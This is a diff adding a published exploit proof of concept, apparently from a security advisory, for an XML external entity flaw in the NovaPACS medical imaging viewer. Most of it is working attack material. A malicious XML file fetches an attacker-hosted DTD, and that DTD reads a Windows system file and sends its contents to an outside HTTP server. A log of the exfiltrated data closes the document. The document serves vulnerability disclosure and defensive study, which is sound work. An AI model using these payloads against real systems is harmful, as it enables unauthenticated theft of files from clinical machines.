@@ -1,0 +1,38 @@
+# Title: NovaRad NovaPACS Diagnostics Viewer 8.5 - XML External Entity Injection (File Disclosure)
+# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
+# Date: 2018-09-07
+# Vendor: NovaRad Corporation
+# Product web page: https://www.novarad.net
+# Affected version: 8.5.19.75 (Diagnostics Viewer, Study Browser)
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+# Advisory ID: ZSL-2018-5488
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5488.php
+# CVE: N/A
+
+# Desc: NovaPACS suffers from an unauthenticated XML External Entity
+# (XXE) injection vulnerability using the DTD parameter entities technique
+# resulting in disclosure and retrieval of arbitrary data from the affected
+# node via out-of-band (OOB) channel attack. The vulnerability is triggered
+# when importing XML format preferences within the settings submenu.
+
+# PoC
+# Malicious.xml:
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE ZSL [
+<!ENTITY % remote SYSTEM "http://10.0.1.230:8080/xxe.xml">
+%remote;
+%root;
+%oob;]>
+
+# Attacker's xxe.xml:
+
+<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://10.0.1.230:8080/?%payload;'> ">
+
+Data retrieval:
+
+lqwrm@metalgear:~$ python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+10.0.1.230 - - [28/Aug/2018 16:27:48] "GET /xxe.xml HTTP/1.1" 200 -
+10.0.1.230 - - [28/Aug/2018 16:27:48] "GET /?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1%0D%0A[MCI%20Extensions.BAK]%0D%0A3g2=MPEGVideo%0D%0A3gp=MPEGVideo%0D%0A3gp2=MPEGVideo%0D%0A3gpp=MPEGVideo%0D%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo%0D%0Amod=MPEGVideo%0D%0Amov=MPEGVideo%0D%0Amp4=MPEGVideo%0D%0Amp4v=MPEGVideo%0D%0Amts=MPEGVideo%0D%0Ats=MPEGVideo%0D%0Atts=MPEGVideo%0D%0A[FIX%20DMACS]%0D%0AMinAfterStartup=0 HTTP/1.1" 200 -
